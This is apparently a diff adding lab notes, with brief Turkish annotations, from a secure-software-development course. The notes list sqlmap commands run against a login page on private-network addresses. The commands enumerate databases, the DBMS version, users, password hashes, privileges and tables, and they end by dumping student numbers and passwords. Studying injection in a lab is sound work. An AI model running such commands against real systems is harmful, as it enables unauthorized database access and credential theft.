@@ -1,0 +1,24 @@
+> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=3
+																(dbs: veritabanları)
+> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -f (fingerprint) vt sürümü
+
+> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" --current-user
+
+--hostname	
+--current-db
+--users
+--passwords
+--privileges
+--roles														
+
+> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables
+
+
+> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables --column
+
+
+> sqlmap -u "http://172.16.0.1/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -D ob -T ogrenciler -C ogrenciNo,sifre --dump
+
+
+
+
